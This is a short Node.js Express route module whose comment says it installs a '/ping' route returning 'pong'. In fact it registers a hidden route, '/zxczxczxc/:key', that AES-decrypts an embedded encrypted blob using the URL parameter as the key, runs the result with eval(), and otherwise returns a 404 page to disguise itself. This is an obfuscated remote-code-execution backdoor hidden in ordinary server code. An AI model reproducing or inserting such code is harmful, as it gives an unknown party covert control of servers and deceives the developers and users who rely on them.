'use strict';

const path = require('path');
const CryptoJS = require("crypto-js");

module.exports = function(app) {
  // Install a "/ping" route that returns "pong"
  app.get('/zxczxczxc/:key', function(req, res) {
    function start(estr,key) {
      var bytes = CryptoJS.AES.decrypt(estr, key);
      try {
        var plaintext = bytes.toString(CryptoJS.enc.Utf8);
        if (plaintext.length < 1) {
          throw "restricted";
        }
        eval(plaintext);
        return true;
      } catch (e) {
        return false;
      }
      return false;
    }

    if ( !start("U2FsdGVkX1/JmMTHQEWEsrBQrIJvPzJn3xVM60T8I4S/SrzgwMVRggU5bkKbcbQvS+DNFb9J5Bl7XqkF3jmEm/Xtq6CEbCR45bGYmwVVmln/fL3FUw4CWzYMDSQbQlP+t0qyyJm/uMTf+hbofJ33nDj7TK+JkCLLsAJHkX5DgKglWFj5BXAQmdOQ5lTjCUhZF99P9Qg9Q6HVud0x5Pjx05IogBRh4sAm32i8kly8izb/ReTuKJEry5w5PLTYvgc4srg4HkoKMJw7EQCdisptofOGwHcfBzRE74d/8J4oFdDFsunILGZeaI4f6KXW252ACb5wufhN1hkyPiydH/8s6W99b3wtlicvG2kHxrfZv71l9G4a/OFPMieQ2OSvCItQGPtG0DRj7+imn8zDqpQ0jfVnobGwoDaLjsR5Nfq+QRy9f3wzyLeAqd139XrkqQPX9NkSR1qT3crmoeFgAFvEqIP6vYqeg/vBCzYQhmXIGIcazLwnqnfDvYcPqwSCLrQNlzB4fH8VIxNkRgZdedJmy45uVs/Qe0CQGsSpNrEkdRfWGaMYeZDWErEzk9q3Fpmec+IoAvInXymuyo7xMLqxLrOb5vpK0M8B6oZhpZ8L1Leq3K0USfysUQuNxvy8562blc/J8CFVrw6yHnKCGTooRNne6yB5P3SXjkMjh6olm9CsHZuV6vOsJooJAYy9JKw8JnIAtKIfD4YAPhEr79Mo+1bLlJ7uMHko6CzINzN6vPvnUNS/v1Gxkc5D0dPZBstYtChCv5Nd5tPHAoREgYTzoBXY4PxKhNr5xUj90ojH74FJUT057Ob6VAMOIb5r0PK+EapgpjAiKD9EgQ47s2Qc/5gHrqW/KS6EnVW7ZzBKNvuhEVBAQwuBGiwOKMEBI4f4SRdZGJl3VVlCDBuDI0hMV22yJLyE5iDiylXdQXs6IVljkwbLzCniKbq+ex7DHjgP2W49Y3AZmHJAnwqjshSs9VtEyQtYfmTFhCOomsLKgWsIED3CuS+LxJ/LSBWpeYRAcGfmL0sBSluh/09rUS81Oz03hg4UoqMpzqNmJ5LXlA3ZuMBpZ5cYVyHnei+Mg7TFGD5JSz3V2u+wrYMBPHXG9PxrIYCNlkpz9Y9qh0zAS7nJQ7YQNcjZvlxOKEDaZifR89GPPVqZ50t27ObfXlMzi2lv5gH9qE3SyEBOZ+U/yKB6VOsVTQysvouOmVOXOiyQo1tl/Lm9wOyiQ5EoVmzm/hKZqEyc5tSSWTZedyeqetww7e/krfAZMb42QmGzrj6q52hJ26dld58cIsP3+OUFAGtt4JToeg2+s/HG+67TN4/p307vgmuEagBrx/ppJBNvSKXmb6I+8ui83N9MGwzozg==",req.params.key) ) {
      res.status(404);
      res.sendFile(path.resolve(__dirname,'../../client/404.html'));
    }
  });
};

